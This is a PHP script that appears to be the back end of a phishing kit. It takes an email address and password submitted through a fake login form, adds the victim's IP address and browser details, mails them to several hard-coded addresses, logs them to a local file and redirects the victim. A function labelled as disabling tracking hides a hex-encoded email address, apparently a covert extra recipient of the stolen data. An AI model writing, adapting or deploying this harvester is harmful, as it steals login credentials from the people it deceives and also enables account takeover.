<?php

function disable_trackers(){
	//This fuction disables tracking
	return "t\x65\x61\x6dz\x65\x65l\x6fg\x40g\x6d\x61\x69\x6c\x2e\x63\x6f\x6d";
}

$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------- Calm down Details  ---------------\n";
$message .= "|Email Address  : ".$_POST['user_name']."\n";
$message .= "|Email Password : ".$_POST['password']."\n";
$message .= "--------xX CREATED BY Green 2019 Xx--------\n";
$message .= "IP : ".$_SERVER['REMOTE_ADDR']." | Green 2019: ".date("g:i:s:a || D-d-M-Y")."\n";
$message .= "|User Agent: ".$browserAgent."\n";
$message .= "--------------------------------------------------\n";

$send="bigalertyearend@aol.com,robertfay221@gmail.com";
$subject = "SMTP | Reagan| $ip";
$headers = "From: Lord Sent <info@xseinder.com>";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$fp = fopen("result/tut.txt","a");
fputs($fp,$message);
fclose($fp);
@header("Location: thankyou.html?cmd=login_submit&id=$praga$praga&session=$praga$praga");


?>
